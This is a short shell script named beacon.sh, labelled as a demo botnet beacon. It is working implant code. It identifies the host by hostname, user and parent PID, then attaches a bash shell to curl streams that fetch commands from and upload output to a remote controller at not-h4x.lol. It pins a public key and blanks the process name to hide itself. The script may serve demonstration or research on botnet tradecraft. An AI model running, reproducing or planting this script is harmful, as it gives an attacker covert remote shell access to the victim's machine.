#!/bin/sh
#
# beacon.sh
# Beacon back to demobotnetcontroller, once
# By J. Stuart McMurray
# Created 20251031
# Last Modified 20251102

# For connecting to demobotnetcontroller.
FP=sha256//cVQqY3gx/qRIe7Zct9/8BFHfyBLV6xMOnGXbWzTPuxo=
ID=$(hostname)-$(whoami)-$PPID
URL=https://not-h4x.lol:4433/bots/$ID

# Other user-serviceable parts.
MAX=180
CURLARGS="--insecure \
        --max-time $MAX \
        --pinnedpubkey $FP \
        --silent \
        --url $URL"

# Hook up curls to a shell.
exec -a '' /bin/bash  \
< <(curl $CURLARGS                 </dev/null 2>&0) \
> >(curl $CURLARGS --upload-file - >/dev/null 2>&1) 2>&1
